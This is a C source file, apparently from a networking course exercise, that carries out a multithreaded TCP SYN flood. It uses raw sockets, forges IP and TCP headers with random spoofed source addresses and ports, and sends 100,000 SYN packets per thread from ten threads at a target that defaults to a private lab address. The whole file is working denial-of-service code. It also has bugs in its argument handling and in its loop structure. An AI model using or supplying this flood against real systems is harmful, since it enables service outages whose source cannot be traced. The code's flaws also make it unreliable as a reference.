/*
 the code below is inspired from tutorial 4a
 additional ressources :
 https://linuxtips.ca/index.php/2022/05/06/create-syn-flood-with-raw-socket-in-c/

 */

#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<unistd.h>
#include<pthread.h>

#include "synking.h"

//now we can declare our global variables and constants:
#define IP_LENGTH 16
#define PACKET_SIZE 2056
#define NUMBER_THREADS 10
int DEST_PORT;
int SRC_PORT;
char DEST_IP[IP_LENGTH];
char SRC_IP [IP_LENGTH];

int sock;
int error;

struct sockaddr_in target;
struct iphdr *iph;
struct tcphdr *tcphd;
struct pseudo_tcp_header psh;




unsigned short checksum(unsigned short *ptr,int nbytes){
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *(&oddbyte)=*ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}

void generating_PACKET (char* packet, char* SRC_IP, int SRC_PORT,char* DEST_IP,int DEST_PORT){
    
    //IP header

    iph = (struct iphdr *) packet;
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
    iph->id = htons(54321);  //Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;      //Set to 0 before calculating checksum
    iph->saddr = inet_addr ( SRC_IP );    //Spoof the source ip address
    iph->daddr = target.sin_addr.s_addr;
    iph->check = checksum ((unsigned short *) packet, iph->tot_len >> 1);
     
    //TCP Header

    tcphd = (struct tcphdr *) (packet + sizeof (struct iphdr));
	tcphd->source = htons(SRC_PORT);	//initial source port
    tcphd->dest = htons (DEST_PORT); 			//destination port
	tcphd->seq = 0; 					    //we don't need to properly sequence the TCP stream for our attack
	tcphd->ack_seq = 0;						//first set at 0
	tcphd->window = htons(5555); 			//window size
	tcphd->check = 0;						//first initialized at 0
	tcphd->urg_ptr = 0; 					//no important data to prioritize
	tcphd->doff = 5; 
	tcphd->fin=0;
	tcphd->syn=1;
	tcphd->rst=0;
	tcphd->psh=0;
	tcphd->ack=0;
	tcphd->urg=0;


    //Now the TCP checksum
     
    psh.source_address = inet_addr( SRC_IP );
    psh.dest_address = target.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);
     
    memcpy(&psh.tcp , tcphd , sizeof (struct tcphdr));
     
    tcphd->check = checksum( (unsigned short*) &psh , sizeof (struct pseudo_tcp_header));
     
    
}
 
void * attack(){
    
    char packet[PACKET_SIZE] ;
    generating_PACKET(packet,SRC_IP,SRC_PORT,DEST_IP,DEST_PORT);
    
     
    //finally ... Attack!!
    int PACKETS_SENT = 0;


    while (PACKETS_SENT<100000)    {
        PACKETS_SENT++;
        memset (packet, 0, PACKET_SIZE); /* zero out the buffer */
        
        //randomizing the source ip addr and the port
        snprintf(SRC_IP,sizeof(SRC_IP),"%d.%d.%d.%d",random()%255,random()%255,random()%255,random()%255);
        SRC_PORT = random()%64331+1024; //ports under 1024 are reserved to the system 
        
        //now that the preliminary work is done, create our packet
        generating_PACKET(packet,SRC_IP,SRC_PORT,DEST_IP,DEST_PORT);


        if (sendto (sock,  packet,  iph->tot_len,  0, (struct sockaddr *) &target,  sizeof (target)) < 0){
            printf ("error sending packet\n");
        }
        else
        {
            printf ("Flooding %s:%d \nPacket %d sent from %s:%d\n --------------------------\n",
            DEST_IP,DEST_PORT,PACKETS_SENT,SRC_IP,SRC_PORT);

            sleep(0); //use this to change the frequency of the attack!
        }
    }

}
int main (int argc, char*argv[])
{
    if (argc<3){
        memcpy(DEST_IP,"192.168.56.101",sizeof("192.168.56.101"));
        DEST_PORT=5000;
    }else{
        memcpy(DEST_IP,argv[2],sizeof(argv[2]));
        DEST_PORT=atoi(argv[3]);
    }
    

    //first we'll create a raw socket
    sock = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);
    //IP_HDRINCL to tell the kernel that headers are included in the packet
    int hincl = 1;
    if (setsockopt (sock, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof (hincl)) < 0)
    {
        fprintf (stderr,"Error creating the raw socket. \n" );
        exit(0);
    }

    target.sin_family = AF_INET;
    target.sin_port = htons(DEST_PORT);
    target.sin_addr.s_addr = inet_addr (DEST_IP);
     
    //now that the preliminary work is done, create our packet
    //we'll create 10 threads each executing the function attack
    pthread_t threads[NUMBER_THREADS];
    for (int i=0;i<NUMBER_THREADS;i++)
        error = pthread_create(&threads[i],NULL,attack,NULL);
        if (error){
            fprintf(stderr,"error creating the thread\n");
        }
    sleep(40); //main thread shouldn't terminate before others
     
    return 0;
}